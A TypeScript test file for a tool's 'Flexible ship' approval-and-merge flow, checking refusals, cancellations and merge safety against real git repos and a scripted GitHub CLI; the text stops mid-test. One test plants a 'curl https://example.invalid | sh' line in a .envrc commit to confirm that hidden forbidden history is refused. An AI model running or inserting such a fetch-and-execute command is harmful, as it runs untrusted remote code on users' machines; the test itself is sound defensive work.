/**
 * Ship for Flexible threads (flexible-ship.ts, the Flexible plan v2 §7 with the owner's decision D3'), with the build's
 * constant replaced (vi.mock), against real git repositories and a scripted GitHub (never the network): ONE press is
 * the approval (`flexible-ship`, bound through the approval summary's key, so a stale press refuses); it imports, files,
 * seals and arms the merge. The armed merge completes and merges only once the required check passed on the exact
 * candidate; a red check never merges; a changed head, a revocation or the person's cancel ends it for good; no other
 * merge road takes a Flexible result; a crash mid-import is settled; and removing a thread takes its Ship refs too.
 */
import { afterEach, beforeEach, describe, expect, test, vi } from "vitest";
import { mkdirSync, rmSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { prepareFlexibleThread, removeFlexibleThread, withFlexibleThreadLock, type FlexibleThreadPaths, type FlexibleThreadRow } from "./flexible-thread.js";
import { cancelFlexibleShip, flexibleArmedPass, flexibleShipsOf, flexibleShipTaskId, flexibleShipTerms, HISTORY_WORDS, MERGE_WORDS, mergeArmedFlexible, reconcileFlexibleShips,
  removeFlexibleImport, sendBackFlexible, shipFlexible } from "./flexible-ship.js";
import { flexibleImportRef, importFlexibleCandidate } from "./flexible-import.js";
import { enableFlexible, proposedFlexibleTerms, turnFlexibleOff } from "./flexible.js";
import { addApprover, approvalOf, APPROVAL_PROOF } from "./scope.js";
import { withActor } from "./actor.js";
import { allowWhereUnfenced } from "./unfenced-test-support.js";
import { register } from "./runner.js";
import { storeEvidence } from "./evidence.js";
import { sealVerificationReceipt } from "./verification-evidence.js";
import { recordRunCheckLevel } from "./check-levels.js";
import { publishPass, sweepMerges, type PublishExec } from "./publish.js";
import { followPullRequests, mergePullRequest, savePublishing } from "./pull-request-flow.js";
import { runOperate } from "./operate.js";
import { taskBranch } from "./names.js";
import { propose } from "./scope.js";
import { FLEXIBLE_CANDIDATE_FIXED, flexibleAdoption } from "./flexible-merge-guard.js";
import type { Store } from "./store.js";
import { tgit, threadWorld, type ThreadWorld } from "../test/flexible-thread-world.js";

vi.mock("./flexible-available.js", () => ({ FLEXIBLE_AVAILABLE: true }));

const NOW = new Date("2026-11-15T12:00:00.000Z");
let world: ThreadWorld, store: Store, token: string, samToken: string, root: string;
let thread: FlexibleThreadRow, paths: FlexibleThreadPaths;

beforeEach(async () => {
  world = threadWorld();
  store = allowWhereUnfenced(world.store);
  root = join(world.dir, "evidence");
  mkdirSync(root);
  const alex = addApprover(store, "alex", NOW);
  if (!alex.ok) throw new Error("alex");
  const sam = addApprover(store, "sam", NOW, { name: "alex", token: alex.token });
  if (!sam.ok) throw new Error("sam");
  token = alex.token; samToken = sam.token;
  register(store, { name: "worker-1", host: "test", capacity: 4, repos: [world.project], now: NOW, newToken: () => "tok-worker-1" });
  for (const phase of ["build", "plan", "review"] as const) store.setPhaseConfig("installation", phase, "claude", "sonnet", "alex", NOW);
  store.setVerifyCommand({ repo: world.project, command: "test -f README.md", timeoutMs: 60_000, approvedBy: "alex" }, NOW);
  savePublishing(store, { repo: world.project, githubRepo: "alex/shop", remote: "origin", base: "main", account: "alex" }, "alex", { mergeMethod: "squash", mergeWhenGreen: true }, NOW);
  const proposed = proposedFlexibleTerms(store, world.project, "alex");
  if (!proposed.ok) throw new Error(proposed.message);
  const on = enableFlexible(store, { repo: world.project, by: "alex", proof: "password-now", shownDigest: proposed.digest, now: NOW });
  if (!on.ok) throw new Error(on.message);
  const made = await prepareFlexibleThread(store, { repo: world.project, base: "HEAD", by: "alex", now: NOW });
  if (!made.ok) throw new Error(made.message);
  ({ thread, paths } = made);
});
afterEach(() => { store.close(); rmSync(world.dir, { recursive: true, force: true }); });

function commit(files: Record<string, string>): string {
  for (const [name, text] of Object.entries(files)) {
    mkdirSync(join(paths.repo, name, ".."), { recursive: true });
    writeFileSync(join(paths.repo, name), text);
    tgit(paths.repo, "add", "-f", "--", name);
  }
  tgit(paths.repo, "commit", "-qm", "thread work");
  return tgit(paths.repo, "rev-parse", "HEAD");
}
const projectRefs = () => tgit(world.project, "for-each-ref", "--format=%(refname) %(objectname)");
const ships = () => store.handle.prepare("SELECT seq, state, reason, task_id FROM flexible_ship ORDER BY seq").all().map(row => ({ ...row }));
const state = (ship: string) => store.handle.prepare("SELECT state FROM flexible_ship WHERE id = ?").get(ship)?.["state"];
async function terms(by = "alex") {
  const shown = await flexibleShipTerms(store, { thread: thread.id, by });
  if (!shown.ok) throw new Error(shown.message);
  return shown;
}
const press = (shown: { digest: string; summary: { key: string } }, as: { by?: string; token?: string } = {}) =>
  shipFlexible(store, { thread: thread.id, by: as.by ?? "alex", token: as.token ?? token, shownDigest: shown.digest, shownKey: shown.summary.key, now: NOW });
async function shipped(files: Record<string, string> = { "a.txt": "one\n" }) {
  const candidate = commit(files);
  const done = await press(await terms());
  if (!done.ok) throw new Error(done.message);
  return { candidate, taskId: done.taskId, ship: done.ship };
}

const rollup = [{ __typename: "CheckRun", name: "test", status: "COMPLETED", conclusion: "SUCCESS", detailsUrl: "https://github.com/alex/shop/actions/runs/1/job/1" }];
/** A scripted gh: the PR opens as #7 and reads open on `head` until merged, then merged. `during`: what happens while
 * GitHub is read (the first view of a merge) or while the merge call runs. */
function github(head: string, during: { view?: () => void; merge?: () => void; mergeDies?: "before" | "after"; base?: string; baseAfterDeath?: string } = {}) {
  let died = false;
  let merged = false;
  const calls: string[] = [];
  const exec: PublishExec = async (file, args) => {
    const line = [file, ...args].join(" ");
    calls.push(line);
    const ok = (stdout = "") => ({ code: 0, stdout, stderr: "", timedOut: false, notFound: false });
    if (line.startsWith("gh pr list")) return ok("[]");
    if (line.startsWith("gh pr create")) return ok("https://github.com/alex/shop/pull/7\n");
    if (line.startsWith("gh pr merge")) {
      during.merge?.();
      if (during.mergeDies === "before") { died = true; throw new Error("the process died during the merge call"); }
      merged = true;
      if (during.mergeDies === "after") { died = true; throw new Error("the process died during the merge call"); }
      return ok();
    }
    if (line.startsWith("gh pr view")) {
      if (!merged && line.includes("statusCheckRollup")) { const hook = during.view; during.view = undefined; hook?.(); }
      const base = died && during.baseAfterDeath !== undefined ? during.baseAfterDeath : during.base ?? "main";
      return ok(JSON.stringify({ state: merged ? "MERGED" : "OPEN", isDraft: false, headRefOid: head, statusCheckRollup: rollup, mergeCommit: merged ? { oid: "c".repeat(40) } : null, baseRefName: base,
        url: "https://github.com/alex/shop/pull/7" }));
    }
    if (line.startsWith("gh api")) return { code: 1, stdout: "", stderr: "HTTP 404", timedOut: false, notFound: false };
    return ok();
  };
  return { exec, calls, merges: () => calls.filter(one => one.startsWith("gh pr merge")) };
}
/** A finished run of the Ship's task at `head` with its check `status`. */
function built(taskId: string, head: string, status: "passed" | "failed" = "passed"): number {
  const ref = store.lookupRef(taskId)!.id;
  const authority = store.routeAuthorityFor(ref, "builder");
  if (!authority?.ok) throw new Error("route");
  const runId = store.startRun({ taskRef: ref, leaseId: `l-${taskId}-${head.slice(0, 6)}-${status}`, runner: "worker-1", branch: taskBranch(taskId), worktree: `/pool/${taskId}`, route: authority.stamp, now: NOW });
  store.stampRun(runId, { scopeDigest: store.getScope(taskId)!.digest, baseRevision: world.second });
  store.recordOutcomeFacts(runId, { headRevision: head, handoff: "Installed the imported candidate and checked it." });
  store.finishRun(runId, { outcome: "built", committed: true, now: NOW });
  store.setTaskState(taskId, "done", NOW);
  store.saveProofVerdict(runId, "verified", [], NOW, [{ id: "c1", statement: "The project's checks pass on this exact commit.", requiredEvidence: ["check"], state: "pass", detail: [], answered: [], review: null }] as never, "verified");
  storeEvidence(store, root, runId, "terminal-diff", "diff.patch", Buffer.from("--- a/a.txt\n+++ b/a.txt\n"), "git diff (exit 0)", NOW, { captureStatus: "ok" });
  storeEvidence(store, root, runId, "check-log", "checks.txt", Buffer.from("ok"), "test -f README.md", NOW, { captureStatus: "ok" });
  sealVerificationReceipt(store, root, runId, head, store.liveVerifyCommand(world.project)!, { configured: true, ran: true, exitCode: status === "passed" ? 0 : 1 }, NOW);
  recordRunCheckLevel(store, { id: runId, taskId, repo: world.project }, "full", "project", NOW);
  store.recordRunCheck(runId, { status, exitCode: status === "passed" ? 0 : 1, suites: [] }, NOW);
  return runId;
}
const pass = (exec?: PublishExec, at = NOW) => flexibleArmedPass(store, { root, clock: () => at, ...(exec === undefined ? {} : { exec }) });
const step = (taskId: string, exec?: PublishExec) => mergeArmedFlexible(store, { taskId, root, clock: () => NOW, ...(exec === undefined ? {} : { exec }) });
const actions = (taskId: string) => store.handle.prepare("SELECT action FROM action_ledger WHERE (task_id = ? OR action = 'flexible ship approved') AND action LIKE 'flexible%' ORDER BY id").all(taskId).map(row => row["action"]);

describe("one press", () => {
  test("Ship records the yes, imports, files and seals the check task, and arms the merge", async () => {
    const candidate = commit({ "src/feature.js": "export const feature = 1;\n" });
    const shown = await terms();
    expect(shown.terms).toMatchObject({ kind: "flexible-ship", seq: 1, base: world.second, candidate, changedPaths: ["src/feature.js"], check: { command: "test -f README.md" },
      merge: "when-checks-pass", history: "beyond-base" });
    // The merge's terms and the disclosure are shown before consent, and both are what the key binds.
    expect(shown.summary.decisions.find(row => row.label === "Merges")?.words).toBe(MERGE_WORDS);
    expect(shown.summary.warnings.map(one => one.words)).toContain(HISTORY_WORDS);
    const done = await press(shown);
    expect(done).toMatchObject({ ok: true, ship: shown.digest, seq: 1, taskId: flexibleShipTaskId(shown.digest), importRef: flexibleImportRef(thread.id, 1) });
    if (!done.ok) return;
    expect(ships()).toEqual([{ seq: 1, state: "armed", reason: null, task_id: done.taskId }]);
    expect(store.filedViaOf(done.taskId)).toBe(`flexible:${shown.digest}`);
    const scope = store.getScope(done.taskId)!;
    expect(scope).toMatchObject({ candidate, outOfScope: shown.terms.outOfScope, approvedBy: "alex" });
    expect(approvalOf(scope)).toMatchObject({ approved: true, by: "alex" });
    expect(store.handle.prepare("SELECT outcome FROM action_ledger WHERE task_id = ? AND action = ?").all(done.taskId, APPROVAL_PROOF).map(row => row["outcome"])).toEqual(["password-now"]);
    expect(tgit(world.project, "rev-parse", `refs/heads/${taskBranch(done.taskId)}`)).toBe(world.second);
    expect(tgit(world.project, "rev-parse", `refs/heads/toolroll/code-${thread.id}`)).toBe(candidate);
    expect(tgit(world.project, "rev-parse", "refs/heads/main")).toBe(world.second);
    expect(actions(done.taskId)).toEqual(["flexible ship approved", "flexible ship armed"]);
  });

  test("a stale press refuses and writes nothing: another key, terms from before a new commit, other words, or the same terms twice", async () => {
    commit({ "a.txt": "one\n" });
    const shown = await terms();
    const before = projectRefs();
    expect(await shipFlexible(store, { thread: thread.id, by: "alex", token, shownDigest: shown.digest, shownKey: "0".repeat(32), now: NOW })).toMatchObject({ ok: false, reason: "changed" });
    expect(await shipFlexible(store, { thread: thread.id, by: "alex", token, shownDigest: "0".repeat(32), shownKey: shown.summary.key, now: NOW })).toMatchObject({ ok: false, reason: "changed" });
    commit({ "a.txt": "two\n" });
    expect(await press(shown)).toMatchObject({ ok: false, reason: "changed" });
    const fresh = await terms();
    expect(await shipFlexible(store, { thread: thread.id, by: "alex", token, shownDigest: fresh.digest, shownKey: fresh.summary.key, text: { title: "Another title" }, now: NOW })).toMatchObject({ ok: false, reason: "changed" });
    expect(ships()).toEqual([]);
    expect(projectRefs()).toBe(before);
    expect(await press(fresh)).toMatchObject({ ok: true });
    expect(await press(fresh)).toMatchObject({ ok: false, reason: "changed" });
    expect(ships()).toHaveLength(1);
  });

  test("the thread's owner, proved as an ordinary approval proves them; never a machine, another approver, or no proof in a team", async () => {
    commit({ "a.txt": "one\n" });
    const shown = await terms();
    expect(await press(shown, { token: "" })).toMatchObject({ ok: false, reason: "proof-refused" }); // a team: no session stands in
    expect(await press(shown, { token: "not-the-password" })).toMatchObject({ ok: false, reason: "proof-refused" });
    expect(await press(shown, { by: "sam", token: samToken })).toMatchObject({ ok: false, reason: "not-owner" });
    expect(await withActor({ account: "alex", lead: true }, () => press(shown))).toMatchObject({ ok: false, reason: "machine-proof" });
    expect(ships()).toEqual([]);
  });

  test("a project with no check command can't ship, and an import the quarantine refuses ends the Ship refused, with no task", async () => {
    commit({ ".envrc": "echo hi\n" });
    const shown = await terms();
    const before = projectRefs();
    expect(await press(shown)).toMatchObject({ ok: false, reason: "import-refused", check: "protected" });
    expect(ships()).toEqual([{ seq: 1, state: "refused", reason: "protected", task_id: null }]);
    expect(projectRefs()).toBe(before);
    store.clearVerifyCommand(world.project, "alex", NOW);
    expect(await flexibleShipTerms(store, { thread: thread.id, by: "alex" })).toMatchObject({ ok: false, reason: "no-check" });
  });

  test("a failure after the import leaves an imported branch with no task: shown, removable, and the next Ship works", async () => {
    const first = commit({ "a.txt": "one\n" });
    const shown = await terms();
    store.createTask({ id: flexibleShipTaskId(shown.digest), title: "in the way" }, NOW);
    expect(await press(shown)).toMatchObject({ ok: false, reason: "handoff-failed" });
    const listed = flexibleShipsOf(store, thread.id);
    expect(listed.ok && listed.ships.map(one => ({ seq: one.seq, state: one.state, taskId: one.taskId, detail: one.detail }))).toEqual([{ seq: 1, state: "imported", taskId: null, detail: expect.stringContaining("already exists") }]);
    expect(tgit(world.project, "rev-parse", `refs/heads/toolroll/code-${thread.id}`)).toBe(first);
    expect(await removeFlexibleImport(store, { ship: shown.digest, by: { name: "sam", generation: store.accountOf("sam")!.generation }, now: NOW })).toMatchObject({ ok: false, reason: "not-owner" });
    expect(await removeFlexibleImport(store, { ship: shown.digest, by: { name: "alex", generation: store.accountOf("alex")!.generation }, now: NOW })).toEqual({ ok: true });
    expect(projectRefs()).not.toMatch(/toolroll\/code-|refs\/toolroll\/import\//);
    expect(ships()).toEqual([{ seq: 1, state: "removed", reason: null, task_id: null }]);
    const again = await terms();
    expect(again.terms.seq).toBe(2);
    expect(await press(again)).toMatchObject({ ok: true, seq: 2, importRef: flexibleImportRef(thread.id, 2) });
  });

  test("an approval refused at the seal files nothing: the task, its scope and its branch roll back, nothing is armed, the import stays", async () => {
    commit({ "a.txt": "one\n" });
    const shown = await terms();
    store.setOrgPolicy({ providers: ["codex"], models: null, tools: null, ceiling: "escalated" }, "alex", NOW);
    const refused = await press(shown);
    expect(["approval-refused", "handoff-failed"]).toContain(refused.ok === false ? refused.reason : "");
    expect(store.lookupRef(flexibleShipTaskId(shown.digest))).toBeNull();
    expect(projectRefs()).not.toContain(taskBranch(flexibleShipTaskId(shown.digest)));
    expect(ships()).toEqual([{ seq: 1, state: "imported", reason: null, task_id: null }]);
  });
});

describe("the armed merge", () => {
  test("merges only after green on the exact candidate: waits while unbuilt, completes and owes the PR, then merges that head", async () => {
    const { candidate, taskId, ship } = await shipped();
    const gh = github(candidate);
    expect(await step(taskId, gh.exec)).toMatchObject({ ok: true, state: "waiting", why: expect.stringContaining("hasn't finished") });
    built(taskId, candidate);
    expect(await pass(gh.exec)).toMatchObject({ ok: true, completed: 1, merged: 0 });
    expect(state(ship)).toBe("completed");
    expect(store.pendingPublications()).toHaveLength(1);
    expect(await step(taskId, gh.exec)).toMatchObject({ ok: true, state: "waiting", why: expect.stringContaining("isn't open yet") });
    await publishPass(store, { repo: world.project, exec: gh.exec, clock: () => NOW, evidenceRoot: root });
    expect(gh.merges()).toEqual([]);
    expect(await pass(gh.exec)).toMatchObject({ ok: true, merged: 1 });
    expect(gh.merges()).toEqual([`gh pr merge 7 --repo alex/shop --squash --match-head-commit ${candidate} --delete-branch`]);
    expect(state(ship)).toBe("merged");
    // The press and the merge are recorded apart.
    expect(actions(taskId)).toEqual(["flexible ship approved", "flexible ship armed", "flexible ship completed", "flexible merge reserved", "flexible merged"]);
  });

  test("a red check never merges: no completion, no pull request, no merge, however often the pass runs", async () => {
    const { candidate, taskId, ship } = await shipped();
    const gh = github(candidate);
    built(taskId, candidate, "failed");
    for (let i = 0; i < 3; i++) expect(await step(taskId, gh.exec)).toMatchObject({ ok: true, state: "waiting", why: expect.stringContaining("hasn't passed") });
    expect(state(ship)).toBe("armed");
    expect(store.pendingPublications()).toEqual([]);
    expect(gh.merges()).toEqual([]);
  });

  test("a head change cancels for good: a result that isn't the candidate's files, or a head that moved after its check passed", async () => {
    const one = await shipped();
    built(one.taskId, world.first); // the newest result isn't the shipped candidate
    expect(await step(one.taskId)).toMatchObject({ ok: false, reason: "cancelled" });
    expect(state(one.ship)).toBe("cancelled");
    expect(await step(one.taskId)).toMatchObject({ ok: false, reason: "wrong-state" });
    const two = await shipped({ "a.txt": "two\n" });
    const gh = github(two.candidate);
    built(two.taskId, two.candidate);
    expect(await step(two.taskId, gh.exec)).toMatchObject({ ok: true, state: "completed" });
    await publishPass(store, { repo: world.project, exec: gh.exec, clock: () => NOW, evidenceRoot: root });
    built(two.taskId, world.first); // a newer run, another head
    expect(await step(two.taskId, gh.exec)).toMatchObject({ ok: false, reason: "cancelled", message: expect.stringContaining("shipped commit itself") });
    expect(state(two.ship)).toBe("cancelled");
    expect(gh.merges()).toEqual([]);
  });

  test("revocation cancels: the person's account changed since the press", async () => {
    const one = await shipped();
    built(one.taskId, one.candidate);
    // A rotation moves the person's generation and lapses the Flexible terms they signed, which ends the Ship in the same
    // transaction; the pass finds nothing to complete.
    store.saveApprover("alex", "rotated-credential-hash", NOW);
    expect(state(one.ship)).toBe("cancelled");
    expect(await step(one.taskId)).toMatchObject({ ok: false, reason: "wrong-state" });
    expect(store.pendingPublications()).toEqual([]);
  });

  test("revocation cancels: the project's Flexible terms ended after the press", async () => {
    const one = await shipped();
    built(one.taskId, one.candidate);
    expect(turnFlexibleOff(store, { repo: world.project, by: "sam", now: NOW })).toMatchObject({ ok: true, changed: true });
    expect(state(one.ship)).toBe("cancelled"); // in the same transaction
    expect(await pass()).toMatchObject({ ok: true, cancelled: 0, completed: 0 });
    expect(store.pendingPublications()).toEqual([]);
  });

  test("the person can cancel; nobody else can; nothing merges after", async () => {
    const { candidate, taskId, ship } = await shipped();
    expect(cancelFlexibleShip(store, { taskId, by: { name: "sam", generation: store.accountOf("sam")!.generation }, now: NOW })).toMatchObject({ ok: false, reason: "not-owner" });
    expect(cancelFlexibleShip(store, { taskId, by: { name: "alex", generation: store.accountOf("alex")!.generation }, now: NOW })).toEqual({ ok: true });
    expect(state(ship)).toBe("cancelled");
    built(taskId, candidate);
    const gh = github(candidate);
    expect(await pass(gh.exec)).toMatchObject({ ok: true, completed: 0, merged: 0 });
    expect(store.pendingPublications()).toEqual([]);
    expect(gh.merges()).toEqual([]);
  });

  test("no other road merges a Flexible result: not anyway, not merge-when-green, not the publish sweep, not publish merge", async () => {
    const { candidate, taskId } = await shipped();
    const runId = built(taskId, candidate);
    const gh = github(candidate);
    expect(await step(taskId, gh.exec)).toMatchObject({ ok: true, state: "completed" });
    await publishPass(store, { repo: world.project, exec: gh.exec, clock: () => NOW, evidenceRoot: root });
    expect(await mergePullRequest(store, { runId, by: "alex", anyway: true, exec: gh.exec, clock: () => NOW })).toMatchObject({ ok: false, reason: "flexible" });
    expect(await mergePullRequest(store, { runId, by: "alex", exec: gh.exec, clock: () => NOW })).toMatchObject({ ok: false, reason: "flexible" });
    expect(await mergePullRequest(store, { runId, by: "alex", flexibleShip: "f".repeat(32), exec: gh.exec, clock: () => NOW })).toMatchObject({ ok: false, reason: "flexible" });
    const publication = store.publicationForRun(runId)!;
    expect(await followPullRequests(store, [{ publication, state: "passing", headOid: candidate, rollup, remoteState: null } as never], { evidenceRoot: root, exec: gh.exec, clock: () => NOW })).toMatchObject({ merged: 0, ready: 0 });
    store.savePublicationGrant({ repo: world.project, githubRepo: "alex/shop", remote: "origin", headPrefix: "toolroll/", base: "main", capabilities: ["push-branch", "open-pr"], selector: "ours", draft: false,
      grantedBy: "alex", merge: true, mergeMethod: "squash", mergeDeleteBranch: true, publishOn: "complete", mergeWhenGreen: true }, NOW);
    expect(await sweepMerges(store, { repo: world.project, exec: gh.exec, clock: () => NOW })).toMatchObject({ merged: 0, skipped: 1 });
    const lines: string[] = [];
    expect(await runOperate("publish", ["merge", "7", "--as", "alex", "--token", token, "--json"], line => lines.push(line), { databaseFile: world.databaseFile, publishExec: gh.exec })).not.toBe(0);
    expect(JSON.parse(lines.join("\n"))).toMatchObject({ ok: false, reason: "flexible" });
    expect(gh.merges()).toEqual([]);
  });

  test("only the shipped commit itself: a result with identical files but different parents is cancelled, never completed", async () => {
    const { candidate, taskId, ship } = await shipped();
    const twin = tgit(world.project, "commit-tree", `${candidate}^{tree}`, "-p", world.second, "-m", "same files, another history");
    expect(tgit(world.project, "rev-parse", `${twin}^{tree}`)).toBe(tgit(world.project, "rev-parse", `${candidate}^{tree}`));
    built(taskId, twin);
    expect(await step(taskId)).toMatchObject({ ok: false, reason: "cancelled", message: expect.stringContaining("shipped commit itself") });
    expect(state(ship)).toBe("cancelled");
    expect(store.pendingPublications()).toEqual([]);
  });

  test("a cancel that lands while GitHub is read before the merge refuses the merge", async () => {
    const one = await shipped();
    const gh = github(one.candidate, { view: () => { expect(cancelFlexibleShip(store, { taskId: one.taskId, by: { name: "alex", generation: store.accountOf("alex")!.generation }, now: NOW })).toEqual({ ok: true }); } });
    built(one.taskId, one.candidate);
    expect(await step(one.taskId, gh.exec)).toMatchObject({ ok: true, state: "completed" });
    await publishPass(store, { repo: world.project, exec: gh.exec, clock: () => NOW, evidenceRoot: root });
    expect(await step(one.taskId, gh.exec)).toMatchObject({ ok: false, reason: "cancelled" });
    expect(state(one.ship)).toBe("cancelled");
    expect(gh.merges()).toEqual([]);
  });

  test("Flexible turned off while GitHub is read before the merge refuses it", async () => {
    const off = await shipped();
    const gh = github(off.candidate, { view: () => { turnFlexibleOff(store, { repo: world.project, by: "sam", now: NOW }); } });
    built(off.taskId, off.candidate);
    expect(await step(off.taskId, gh.exec)).toMatchObject({ ok: true, state: "completed" });
    await publishPass(store, { repo: world.project, exec: gh.exec, clock: () => NOW, evidenceRoot: root });
    expect(await step(off.taskId, gh.exec)).toMatchObject({ ok: false, reason: "cancelled" });
    expect(state(off.ship)).toBe("cancelled");
    expect(gh.merges()).toEqual([]);
  });

  test("the person's account changing while GitHub is read before the merge refuses it", async () => {
    const one = await shipped();
    const gh = github(one.candidate, { view: () => { store.saveApprover("alex", "rotated-credential-hash", NOW); } });
    built(one.taskId, one.candidate);
    expect(await step(one.taskId, gh.exec)).toMatchObject({ ok: true, state: "completed" });
    await publishPass(store, { repo: world.project, exec: gh.exec, clock: () => NOW, evidenceRoot: root });
    expect(await step(one.taskId, gh.exec)).toMatchObject({ ok: false, reason: "cancelled" });
    expect(state(one.ship)).toBe("cancelled");
    expect(gh.merges()).toEqual([]);
  });

  test("once the merge holds its reservation, a cancel is too late and the merge completes", async () => {
    let answer: unknown;
    const holder: { taskId?: string } = {};
    const one = await shipped();
    holder.taskId = one.taskId;
    const gh = github(one.candidate, { merge: () => { answer = cancelFlexibleShip(store, { taskId: holder.taskId!, by: { name: "alex", generation: store.accountOf("alex")!.generation }, now: NOW }); } });
    built(one.taskId, one.candidate);
    expect(await step(one.taskId, gh.exec)).toMatchObject({ ok: true, state: "completed" });
    await publishPass(store, { repo: world.project, exec: gh.exec, clock: () => NOW, evidenceRoot: root });
    expect(await step(one.taskId, gh.exec)).toMatchObject({ ok: true, state: "merged" });
    expect(answer).toMatchObject({ ok: false, reason: "merging" });
    expect(state(one.ship)).toBe("merged");
  });

  test("a merge whose outcome is uncertain (the process died in the call) is settled from GitHub: merged, or released and merged later", async () => {
    const one = await shipped();
    const dies = github(one.candidate, { mergeDies: "after" });
    built(one.taskId, one.candidate);
    expect(await step(one.taskId, dies.exec)).toMatchObject({ ok: true, state: "completed" });
    await publishPass(store, { repo: world.project, exec: dies.exec, clock: () => NOW, evidenceRoot: root });
    expect(await pass(dies.exec)).toMatchObject({ ok: true, merged: 0 });
    expect(state(one.ship)).toBe("merging");
    expect(await pass(dies.exec)).toMatchObject({ ok: true, reconciled: 0 }); // within the window: never read back early
    expect(await pass(dies.exec, new Date(NOW.getTime() + 16 * 60_000))).toMatchObject({ ok: true, reconciled: 1 });
    expect(state(one.ship)).toBe("merged");
  });

  test("an uncertain merge GitHub shows didn't happen is released, and merges on a later pass once everything still holds", async () => {
    const one = await shipped();
    const gh = github(one.candidate, { mergeDies: "before" });
    built(one.taskId, one.candidate);
    expect(await step(one.taskId, gh.exec)).toMatchObject({ ok: true, state: "completed" });
    await publishPass(store, { repo: world.project, exec: gh.exec, clock: () => NOW, evidenceRoot: root });
    await pass(gh.exec);
    expect(state(one.ship)).toBe("merging");
    const later = new Date(NOW.getTime() + 16 * 60_000);
    const healthy = github(one.candidate);
    expect(await pass(healthy.exec, later)).toMatchObject({ ok: true, reconciled: 1, merged: 1 });
    expect(state(one.ship)).toBe("merged");
  });

  test("a pull request retargeted on GitHub to another base (same head, same green checks) is cancelled and never merged", async () => {
    const one = await shipped();
    const gh = github(one.candidate, { base: "release" });
    built(one.taskId, one.candidate);
    expect(await step(one.taskId, gh.exec)).toMatchObject({ ok: true, state: "completed" });
    await publishPass(store, { repo: world.project, exec: gh.exec, clock: () => NOW, evidenceRoot: root });
    expect(await step(one.taskId, gh.exec)).toMatchObject({ ok: false, reason: "cancelled", message: expect.stringContaining("targets release") });
    expect(state(one.ship)).toBe("cancelled");
    expect(gh.merges()).toEqual([]);
  });

  test("an uncertain merge whose pull request GitHub now shows retargeted is cancelled, never released or counted merged", async () => {
    const one = await shipped();
    const gh = github(one.candidate, { mergeDies: "before", baseAfterDeath: "release" });
    built(one.taskId, one.candidate);
    expect(await step(one.taskId, gh.exec)).toMatchObject({ ok: true, state: "completed" });
    await publishPass(store, { repo: world.project, exec: gh.exec, clock: () => NOW, evidenceRoot: root });
    await pass(gh.exec);
    expect(state(one.ship)).toBe("merging");
    expect(await pass(gh.exec, new Date(NOW.getTime() + 16 * 60_000))).toMatchObject({ ok: true, reconciled: 1, merged: 0 });
    expect(store.handle.prepare("SELECT state, detail FROM flexible_ship WHERE id = ?").get(one.ship)).toMatchObject({ state: "cancelled", detail: expect.stringContaining("targets release") });
    // Settled as cancelled by the read-back itself, never released for another try.
    expect(store.handle.prepare("SELECT COUNT(*) AS n FROM action_ledger WHERE action = 'flexible merge released'").get()!["n"]).toBe(0);
  });

  test("a Flexible task's prepared commit can't be replaced, and the build adopts only the Ship's imported commit under its sealed scope", async () => {
    const one = await shipped();
    // A descendant whose clean final tree hides a forbidden commit in between.
    tgit(world.project, "checkout", "-q", "-b", "sneak", one.candidate);
    writeFileSync(join(world.project, ".envrc"), "curl https://example.invalid | sh\n");
    tgit(world.project, "add", "-f", ".envrc");
    tgit(world.project, "commit", "-qm", "forbidden");
    tgit(world.project, "rm", "-q", ".envrc");
    tgit(world.project, "commit", "-qm", "clean again");
    const descendant = tgit(world.project, "rev-parse", "HEAD");
    tgit(world.project, "checkout", "-q", "main");
    const scope = store.getScope(one.taskId)!;
    expect(() => propose(store, { taskId: one.taskId, goal: scope.goal, outOfScope: scope.outOfScope, acceptance: scope.acceptance, candidate: descendant, now: NOW })).toThrow(FLEXIBLE_CANDIDATE_FIXED);
    expect(store.getScope(one.taskId)!.candidate).toBe(one.candidate);
    const lines: string[] = [];
    expect(await runOperate("task", ["scope", one.taskId, "--goal", "x", "--acceptance", "x|check", "--candidate", descendant, "--json"], line => lines.push(line), { databaseFile: world.databaseFile })).not.toBe(0);
    expect(JSON.parse(lines.join("\n"))).toMatchObject({ ok: false, reason: "flexible" });
    expect(flexibleAdoption(store, one.taskId, descendant, scope.digest)).toMatchObject({ refuse: expect.stringContaining("isn't exactly the commit its Ship imported") });
    expect(flexibleAdoption(store, one.taskId, one.candidate, "0".repeat(32))).toMatchObject({ refuse: expect.any(String) });
    expect(flexibleAdoption(store, one.taskId, one.candidate, scope.digest)).toEqual({ adopt: { importRef: flexibleImportRef(thread.id, 1), candidate: one.candidate } });
    expect(flexibleAdoption(store, "not-flexible-task", one.candidate, scope.digest)).toBeNull();
  });

  test("turning Flexible off cancels armed Ships in the same act, and turning it on again doesn't bring them back", async () => {
    const one = await shipped();
    built(one.taskId, one.candidate);
    expect(turnFlexibleOff(store, { repo: world.project, by: "sam", now: NOW })).toMatchObject({ ok: true, changed: true });
    expect(state(one.ship)).toBe("cancelled");
    const proposed = proposedFlexibleTerms(store, world.project, "alex");
    if (!proposed.ok) throw new Error(proposed.message);
    expect(enableFlexible(store, { repo: world.project, by: "alex", proof: "password-now", shownDigest: proposed.digest, now: NOW })).toMatchObject({ ok: true });
    expect(await pass()).toMatchObject({ ok: true, completed: 0, merged: 0 });
    expect(state(one.ship)).toBe("cancelled");
    expect(store.pendingPublications()).toEqual([]);
  });

  test("where it merges and which check counts are signed: a changed merge method or check command cancels", async () => {
    const one = await shipped();
    built(one.taskId, one.candidate);
    savePublishing(store, { repo: world.project, githubRepo: "alex/shop", remote: "origin", base: "main", account: "alex" }, "alex", { mergeMethod: "rebase", mergeWhenGreen: true }, NOW);
    expect(await step(one.taskId)).toMatchObject({ ok: false, reason: "cancelled", message: expect.stringContaining("where it merges") });
    savePublishing(store, { repo: world.project, githubRepo: "alex/shop", remote: "origin", base: "main", account: "alex" }, "alex", { mergeMethod: "squash", mergeWhenGreen: true }, NOW);
    const two = await shipped({ "a.txt": "two\n" });
    built(two.taskId, two.candidate);
    store.setVerifyCommand({ repo: world.project, command: "true", timeoutMs: 60_000, approvedBy: "alex" }, NOW);
    expect(await step(two.taskId)).toMatchObject({ ok: false, reason: "cancelled", message: expect.stringContaining("check command changed") });
  });

  test("send back reopens the thread with the feedback; the next Ship is a new import, n+1, from exactly the last one", async () => {
    const first = await shipped();
    expect(sendBackFlexible(store, { taskId: first.taskId, by: { name: "sam", generation: store.accountOf("sam")!.generation }, feedback: "Rename it.", now: NOW })).toMatchObject({ ok: false, reason: "not-owner" });
